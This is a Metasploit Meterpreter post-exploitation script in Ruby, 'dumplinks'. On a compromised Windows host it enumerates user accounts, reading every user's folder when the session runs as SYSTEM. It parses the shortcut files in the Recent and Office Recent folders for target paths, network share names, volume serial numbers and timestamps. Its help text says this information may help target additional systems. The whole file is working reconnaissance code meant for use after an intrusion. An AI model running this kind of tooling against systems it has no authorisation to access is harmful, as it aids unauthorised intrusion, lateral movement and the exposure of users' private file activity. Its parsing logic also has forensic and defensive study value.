##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##



# Author: davehull at dph_msf@trustedsignal.com
#-------------------------------------------------------------------------------

opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help menu." ],
  "-e" => [ false, "Dump everything for each link file." ],
  "-w" => [ false, "Redirect output to file."]
)

@everything, @output_dir, @data_out = nil
opts.parse(args) { |opt, idx, val|
  case opt
  when '-e'
    @everything = true
  when '-w'
    @output_dir = ::File.join(Msf::Config.log_directory,'scripts', 'dumplinks')
  when "-h"
    print_line "dumplinks -- parse .lnk files from user's Recent Documents"
    print_line
    print_line "dumplinks is a modified port of Harlan Carvey's lslnk.pl Perl script."
    print_line "dumplinks parses .lnk files from a user's Recent documents folder and"
    print_line "Microsoft Office's Recent documents folder, if present. Windows creates"
    print_line "these link files automatically for many common file types."
    print_line
    print_line "\tResults are saved to #{::File.join(Msf::Config.log_directory, 'dumplinks')} if -w is used."
    print_line
    print_line "The .lnk files contain time stamps, file locations, including share"
    print_line "names, volume serial #s and more. This info may help you target"
    print_line "additional systems."
    print_line
    print_line "By default, dumplinks only returns the destination for the shortcut."
    print_line "See the available arguments for other options."
    print_line (opts.usage)
    raise Rex::Script::Completed
  end
}

# ----------------------------------------------------------------
# Set up the environment
@client = client
info = @client.sys.config.sysinfo
os = @client.sys.config.sysinfo['OS']

if @output_dir
  # Create filename info to be appended to downloaded files
  filenameinfo = "_" + ::Time.now.strftime("%Y%m%d")

  # Create a directory for the output
  @logs = ::File.join(@output_dir, Rex::FileUtils.clean_path(info['Computer'] + filenameinfo))

  # Create output directory
  ::FileUtils.mkdir_p(@logs)
end
# ---------------------------------------------------------------

# Function for enumerating users if running as SYSTEM
# Borrowed from get_pidgin_creds
def enum_users(os)
  users = []
  userinfo = {}
  userpath = nil
  useroffcpath = nil
  sysdrv = @client.sys.config.getenv('SystemDrive')
  if os =~ /Windows 7|Vista|2008/
    userpath = sysdrv + "\\Users\\"
    lnkpath = "\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\"
    officelnkpath = "\\AppData\\Roaming\\Microsoft\\Office\\Recent\\"
  else
    userpath = sysdrv + "\\Documents and Settings\\"
    lnkpath = "\\Recent\\"
    officelnkpath = "\\Application Data\\Microsoft\\Office\\Recent\\"
  end
  if @client.sys.config.is_system?
    print_status("Running as SYSTEM extracting user list...")
    @client.fs.dir.foreach(userpath) do |u|
      next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini)$/
      userinfo['username'] = u
      userinfo['userpath'] = userpath + u + lnkpath
      userinfo['useroffcpath'] = userpath + u + officelnkpath
      userinfo['userpath'] = dir_entry_exists(userinfo['userpath'])
      userinfo['useroffcpath'] = dir_entry_exists(userinfo['useroffcpath'])
      users << userinfo
    end
  else
    uservar = @client.sys.config.getenv('USERNAME')
    userinfo['username'] = uservar
    userinfo['userpath'] = userpath + uservar + lnkpath
    userinfo['useroffcpath'] = userpath + uservar + officelnkpath
    userinfo['userpath'] = dir_entry_exists(userinfo['userpath'])
    userinfo['useroffcpath'] = dir_entry_exists(userinfo['useroffcpath'])
    users << userinfo
  end
  return users
end

# This is a hack because Meterpreter doesn't support exists?(file)
def dir_entry_exists(path)
  files = @client.fs.dir.entries(path)
rescue
  return nil
else
  return path
end

def extract_lnk_info(path)
  @client.fs.dir.foreach(path) do |file_name|
    if file_name =~ /\.lnk$/   # We have a .lnk file
      record = nil
      offset = 0 # ToDo: Look at moving this to smaller scope
      lnk_file = @client.fs.file.new(path + file_name, "rb")
      record = lnk_file.sysread(0x04)
      if record.unpack('V')[0] == 76  # We have a .lnk file signature
        file_stat = @client.fs.filestat.new(path + file_name)
        print_status "Processing: #{path + file_name}."
        @data_out = ""

        record = lnk_file.sysread(0x48)
        hdr = get_headers(record)

        if @everything
          @data_out += get_lnk_file_MAC(file_stat, path, file_name)
          @data_out += "Contents of #{path + file_name}:\n"
          @data_out += get_flags(hdr)
          @data_out += get_attrs(hdr)
          @data_out += get_lnk_MAC(hdr)
          @data_out += get_showwnd(hdr)
          @data_out += get_lnk_MAC(hdr)
        end
        if shell_item_id_list(hdr)
          # advance the file & offset
          offset += 0x4c
          lnk_file.sysseek(offset, ::IO::SEEK_SET)
          record = lnk_file.sysread(2)
          offset += record.unpack('v')[0] + 2
        end
        # Get File Location Info
        if (hdr["flags"] & 0x02) > 0
          lnk_file.sysseek(offset, ::IO::SEEK_SET)
          record = lnk_file.sysread(4)
          tmp = record.unpack('V')[0]
          if tmp > 0
            lnk_file.sysseek(offset, ::IO::SEEK_SET)
            record = lnk_file.sysread(0x1c)
            loc = get_file_location(record)
            if (loc['flags'] & 0x01) > 0
              if @everything
                @data_out += "\tShortcut file is on a local volume.\n"
              end
              lnk_file.sysseek(offset + loc['vol_ofs'], ::IO::SEEK_SET)
              record = lnk_file.sysread(0x10)
              lvt = get_local_vol_tbl(record)
              lvt['name'] = lnk_file.sysread(lvt['len'] - 0x10)
              if @everything
                @data_out += "\t\tVolume Name = #{lvt['name']}\n" +
                  "\t\tVolume Type = #{get_vol_type(lvt['type'])}\n" +
                  "\t\tVolume SN   = 0x%X" % lvt['vol_sn'] + "\n"
              end
            end

            if (loc['flags'] & 0x02) > 0
              if @everything
                @data_out += "\tFile is on a network share.\n"
              end
              lnk_file.sysseek(offset + loc['network_ofs'], ::IO::SEEK_SET)
              record = lnk_file.sysread(0x14)
              nvt = get_net_vol_tbl(record)
              nvt['name'] = lnk_file.sysread(nvt['len'] - 0x14)
              if @everything
                @data_out += "\tNetwork Share name = #{nvt['name']}\n"
              end
            end

            if loc['base_ofs'] > 0
              @data_out += get_target_path(loc['base_ofs'] + offset, lnk_file)
            elsif loc['path_ofs'] > 0
              @data_out += get_target_path(loc['path_ofs'] + offset, lnk_file)
            end
          end
        end
      end
      lnk_file.close
      if @output_dir
        @file_out_name = @logs + "/" + file_name + ".txt"
        print_status "Writing: #{@file_out_name}"
        filewrt(@file_out_name, @data_out)
      else
        print_status @data_out
      end
    end
  end
end

# Not only is this code slow, it seems
# buggy. I'm studying the recently released
# MS Specs for a better way.
def get_target_path(path_ofs, lnk_file)
  name = []
  lnk_file.sysseek(path_ofs, ::IO::SEEK_SET)
  record = lnk_file.sysread(2)
  while (record.unpack('v')[0] != 0)
    name.push(record)
    record = lnk_file.sysread(2)
  end
  return "\tTarget path = #{name.join}\n"
end

def shell_item_id_list(hdr)
  # Check for Shell Item ID List
  if (hdr["flags"] & 0x01) > 0
    return true
  else
    return nil
  end
end

def get_lnk_file_MAC(file_stat, path, file_name)
  data_out = "#{path + file_name}:\n"
  data_out += "\tAccess Time       = #{file_stat.atime}\n"
  data_out += "\tCreation Date     = #{file_stat.ctime}\n"
  data_out += "\tModification Time = #{file_stat.mtime}\n"
  return data_out
end

def get_vol_type(type)
  vol_type = { 0 => "Unknown",
    1 => "No root directory",
    2 => "Removable",
    3 => "Fixed",
    4 => "Remote",
    5 => "CD-ROM",
    6 => "RAM Drive"}
  return vol_type[type]
end

def get_showwnd(hdr)
  showwnd = { 0 => "SW_HIDE",
    1 => "SW_NORMAL",
    2 => "SW_SHOWMINIMIZED",
    3 => "SW_SHOWMAXIMIZED",
    4 => "SW_SHOWNOACTIVE",
    5 => "SW_SHOW",
    6 => "SW_MINIMIZE",
    7 => "SW_SHOWMINNOACTIVE",
    8 => "SW_SHOWNA",
    9 => "SW_RESTORE",
    10 => "SHOWDEFAULT"}
  data_out = "\tShowWnd value(s):\n"
  showwnd.each do |key, value|
    if (hdr["showwnd"] & key) > 0
      data_out += "\t\t#{showwnd[key]}.\n"
    end
  end
  return data_out
end

def get_lnk_MAC(hdr)
  data_out = "\tTarget file's MAC Times stored in lnk file:\n"
  data_out += "\t\tCreation Time     = #{Time.at(hdr["ctime"])}. (UTC)\n"
  data_out += "\t\tModification Time = #{Time.at(hdr["mtime"])}. (UTC)\n"
  data_out += "\t\tAccess Time       = #{Time.at(hdr["atime"])}. (UTC)\n"
  return data_out
end

def get_attrs(hdr)
  fileattr = {0x01 => "Target is read only",
    0x02 => "Target is hidden",
    0x04 => "Target is a system file",
    0x08 => "Target is a volume label",
    0x10 => "Target is a directory",
    0x20 => "Target was modified since last backup",
    0x40 => "Target is encrypted",
    0x80 => "Target is normal",
    0x100 => "Target is temporary",
    0x200 => "Target is a sparse file",
    0x400 => "Target has a reparse point",
    0x800 => "Target is compressed",
    0x1000 => "Target is offline"}
  data_out = "\tAttributes:\n"
  fileattr.each do |key, attr|
    if (hdr["attr"] & key) > 0
      data_out += "\t\t#{fileattr[key]}.\n"
    end
  end
  return data_out
end

# Function for writing results of other functions to a file
def filewrt(file2wrt, data2wrt)
  output = ::File.open(file2wrt, "a")
  if data2wrt
    data2wrt.each_line do |d|
      output.puts(d)
    end
  end
  output.close
end

def get_flags(hdr)
  flags  = {0x01 => "Shell Item ID List exists",
    0x02 => "Shortcut points to a file or directory",
    0x04 => "The shortcut has a descriptive string",
    0x08 => "The shortcut has a relative path string",
    0x10 => "The shortcut has working directory",
    0x20 => "The shortcut has command line arguments",
    0x40 => "The shortcut has a custom icon"}
  data_out = "\tFlags:\n"
  flags.each do |key, flag|
    if (hdr["flags"] & key) > 0
      data_out += "\t\t#{flags[key]}.\n"
    end
  end
  return data_out
end

def get_headers(record)
  hd = record.unpack('x16V12x8')
  hdr = Hash.new()
  hdr["flags"]    = hd[0]
  hdr["attr"]     = hd[1]
  hdr["ctime"]    = get_time(hd[2], hd[3])
  hdr["mtime"]    = get_time(hd[4], hd[5])
  hdr["atime"]    = get_time(hd[6], hd[7])
  hdr["length"]   = hd[8]
  hdr["icon_num"] = hd[9]
  hdr["showwnd"]  = hd[10]
  hdr["hotkey"]   = hd[11]
  return hdr
end

def get_net_vol_tbl(file_net_rec)
  nv = Hash.new()
  (nv['len'], nv['ofs']) = file_net_rec.unpack("Vx4Vx8")
  return nv
end

def get_local_vol_tbl(lvt_rec)
  lv = Hash.new()
  (lv['len'], lv['type'], lv['vol_sn'], lv['ofs']) = lvt_rec.unpack('V4')
  return lv
end

def get_file_location(file_loc_rec)
  location = Hash.new()
  (location["len"], location["ptr"], location["flags"],
    location["vol_ofs"], location["base_ofs"], location["network_ofs"],
    location["path_ofs"]) = file_loc_rec.unpack('V7')
  return location
end

def get_time(lo_byte, hi_byte)
  if (lo_byte == 0 && hi_byte == 0)
    return 0
  else
    lo_byte -= 0xd53e8000
    hi_byte -= 0x019db1de
    time = (hi_byte * 429.4967296 + lo_byte/1e7).to_i
    if time < 0
      return 0
    end
  end
  return time
end
if client.platform == 'windows'
  enum_users(os).each do |user|
    if user['userpath']
      print_status "Extracting lnk files for user #{user['username']} at #{user['userpath']}..."
      extract_lnk_info(user['userpath'])
    else
      print_status "No Recent directory found for user #{user['username']}. Nothing to do."
    end
    if user['useroffcpath']
      print_status "Extracting lnk files for user #{user['username']} at #{user['useroffcpath']}..."
      extract_lnk_info(user['useroffcpath'])
    else
      print_status "No Recent Office files found for user #{user['username']}. Nothing to do."
    end
  end
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
